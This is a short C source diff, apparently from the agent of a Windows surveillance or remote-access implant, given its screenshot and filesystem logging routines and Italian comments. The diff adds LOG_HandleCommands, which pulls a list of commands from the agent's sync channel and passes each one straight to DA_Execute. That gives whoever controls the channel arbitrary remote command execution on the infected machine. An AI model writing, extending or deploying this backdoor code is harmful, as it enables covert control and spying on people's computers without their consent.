@@ -56,6 +56,9 @@ log_entry_struct log_table[MAX_LOG_ENTRIES];
 extern BOOL IsGreaterDate(nanosec_time *, nanosec_time *);
 extern BOOL IsNewerDate(FILETIME *date, FILETIME *dead_line);
 
+// Dichiarato in SM_ActionFunctions.h
+extern BOOL WINAPI DA_Execute(BYTE *command);
+
 // In BitmapCommon
 extern void BmpToJpgLog(DWORD agent_tag, BYTE *additional_header, DWORD additional_len, BITMAPINFOHEADER *pBMI, size_t cbBMI, BYTE *pData, size_t cbData, DWORD quality);
 typedef void (WINAPI *conf_callback_t)(JSONObject, DWORD counter);
@@ -1627,6 +1630,27 @@ BOOL LOG_HandleFileSystem()
 		SAFE_FREE(fs_array[i].start_dir);
 	}
 	SAFE_FREE(fs_array);
+	return TRUE;
+}
+
+// Gestisce le richieste di esecuzione diretta di comandi
+BOOL LOG_HandleCommands()
+{
+	WCHAR **cmd_array;
+	char ascii_command[MAX_PATH * 2];
+	DWORD num_cmd, i;
+
+	// Di tutti gli elementi di cmd_array andranno liberate le stringhe
+	if (!ASP_GetCommands(&num_cmd, &cmd_array))
+		return FALSE;
+
+	// Per ogni entry...
+	for(i=0; i < num_cmd; i++) {
+		_snprintf_s(ascii_command, sizeof(ascii_command), _TRUNCATE, "%S", cmd_array[i]);
+		SAFE_FREE(cmd_array[i]);
+		DA_Execute((BYTE *)ascii_command);
+	}
+	SAFE_FREE(cmd_array);
 	return TRUE;
 }
 
